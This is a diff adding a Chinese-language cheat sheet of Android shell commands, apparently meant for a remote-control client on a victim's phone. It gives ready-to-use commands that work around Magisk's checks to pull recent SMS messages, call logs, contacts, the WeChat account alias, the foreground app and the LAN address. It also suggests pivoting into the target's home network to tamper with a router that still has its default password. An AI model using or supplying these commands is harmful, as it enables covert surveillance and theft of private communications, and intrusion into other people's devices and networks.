@@ -1,0 +1,40 @@
+有些时候，客户端的手机如果使用的是magisk，那么获取短信 通讯录等功能无法正常运行，原因是magisk对命令调用者的上下文有额外检查！那么可以使用以下命令来获取目标的信息
+
+
+--------------------------------------------
+
+获取最新3条短信
+
+content query --uri content://sms/inbox --projection address:body --sort "_id DESC"|sed '/Row: 3/,$d;s/.*body=//'
+--------------------------------------------
+
+获取最新3条通话计划
+type → 通话类型（1来电 2去电 3未接）
+
+content query --uri content://call_log/calls --projection number:type:date:duration --sort "_id DESC" | sed '/Row: 3/,$d'
+--------------------------------------------
+
+获取10条联系人电话号码信息
+
+content query --uri content://com.android.contacts/data/phones --projection display_name:data1 --sort "_id DESC" | sed '/Row: 10/,$d'  
+--------------------------------------------
+
+获取微信号
+
+sed -n 's/.*<string name="last_login_alias">\([^<]*\)<.*/\1/p' /data/user/0/com.tencent.mm/shared_prefs/com.tencent.mm_preferences.xml | sed 's/^/微信号:/'
+--------------------------------------------
+
+获取电量
+
+acpi | while read line; do echo "电量:$line";done
+--------------------------------------------
+
+获取当前主屏幕正在运行的应用(显示包名信息以及类名Activity名)
+
+echo "当前运行的应用:$(dumpsys activity activities | grep -E 'mFocusedWindow=')"
+--------------------------------------------
+
+获取内网地址(可以在客户端做内网穿透，如果目标家里路由器密码是默认的，那你就可以直接上它路由器做手脚了，比如改密码改wifi名啥的)
+
+echo "内网地址:$(ifconfig wlan0 | grep 'inet addr' | awk '{print $2}')"
+--------------------------------------------
